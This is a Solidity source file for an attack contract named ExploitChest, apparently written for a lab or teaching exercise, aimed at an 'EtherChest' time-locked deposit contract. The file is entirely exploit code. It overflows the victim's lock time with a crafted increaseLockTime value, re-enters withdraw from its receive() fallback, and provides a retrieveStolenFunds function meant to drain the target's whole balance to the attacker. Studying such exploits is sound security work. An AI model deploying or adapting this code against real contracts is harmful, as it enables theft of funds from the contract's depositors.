// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface EtherChestInterface {
    function deposit() external payable;

    function withdraw(uint _amount) external;

    function increaseLockTime(uint _secondsToIncrease) external;

    function getLockTime() external view returns(uint);
}

contract ExploitChest {
    EtherChestInterface public etherChest;
    address payable owner; 
    bool performAttack = true;

    // No need for payable constructor, enough to send ether iwith attack call
    constructor(EtherChestInterface _etherChestAddress) {
        etherChest = EtherChestInterface(_etherChestAddress);
        owner = msg.sender;
    }

    // Fallback is called when etherChest sends Ether to this contract.
    receive() payable external {
        if (performAttack) {
            performAttack = false;
            etherChest.withdraw(1 ether);
        }
    }

    function exploit() external payable {
        require(msg.value >= 1 ether);
        etherChest.deposit{ value: 1 ether}();
        
        etherChest.increaseLockTime(
            type(uint).max + 1 - etherChest.getLockTime()
        );
        etherChest.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }


    function retrieveStolenFunds() public {
        etherChest.withdraw(address(etherChest).balance);
        owner.transfer(address(this).balance);
    }

}